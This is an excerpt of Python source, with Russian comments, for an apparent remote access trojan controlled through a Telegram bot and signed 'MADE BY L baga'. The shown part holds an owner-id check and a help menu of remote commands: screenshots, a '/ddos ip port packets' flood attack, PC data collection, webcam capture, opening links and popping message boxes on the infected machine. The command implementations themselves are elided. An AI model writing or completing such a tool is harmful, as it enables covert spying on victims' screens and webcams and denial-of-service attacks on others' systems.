...
user_path = os.path.expanduser('~') # Путь к папке 
...
while True:
    try:
            ...
            if message.chat.id==usid:
                try:
                    bot.send_message(message.chat.id, """
                        ...
                        \n Дискорд сервер L baga - https://discord.gg/PXXHeSDdym
                        \n/screen - Скриншот
                        \n/ddos ip port packets - ddos атака, пример - /ddos 127.0.0.0 7777 100 
                        \n/pc_info - Данные о пк
                        \n/webp - Фото с веб камеры
                        \n/open_link https://ссылка - Открывает ссылку в браузере и присылает скриншот
                        \n/msgbox текст - Выводит окно с вашим текстом
        ...
        def hello(message, res=False):
            try:
                bot.reply_to(message, 'Я не знаю что ответить на это, используй /help Для получения списка моих команд\n MADE BY L baga')
            except Exception as e:
                bot.reply_to(message, e)
        bot.polling()
    except Exception as e: 
